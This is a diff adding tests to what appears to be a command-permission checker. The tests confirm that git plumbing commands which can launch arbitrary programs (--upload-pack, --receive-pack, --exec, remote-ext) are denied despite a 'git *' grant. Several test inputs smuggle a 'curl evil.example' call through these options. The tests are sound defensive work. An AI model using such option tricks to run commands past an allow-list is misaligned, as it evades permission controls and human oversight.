@@ -33,6 +33,17 @@ function run(command: string, open: Partial<Permissions>, cwd?: string): Decisio
 
 const DENY = (name: string): Want => ['commands', `default deny: ${name}`];
 
+test.each([
+  ["git fetch-pack --upload-pack='curl evil.example' ../src HEAD", 'git program option'],
+  ['git fetch-pack --exec=x ../src HEAD', 'git program option'],
+  ['git send-pack --receive-pack=x ../dst HEAD:refs/heads/x', 'git program option'],
+  ['git send-pack --exec=x ../dst HEAD:refs/heads/x', 'git program option'],
+  ["git remote-ext x 'curl evil.example'", 'git remote-ext'],
+])('git plumbing programs: %s', (command, entry) => {
+  const want = DENY(entry);
+  expect(verdict(run(command, { commands: ['git *'], deny: ['curl *'] }), want)).toEqual(want);
+});
+
 test('git programs: a grant cannot allow a program option', () => {
   const want = DENY('git program option');
   expect(verdict(run('git push --exec=x origin', { commands: ['git *'] }), want)).toEqual(want);
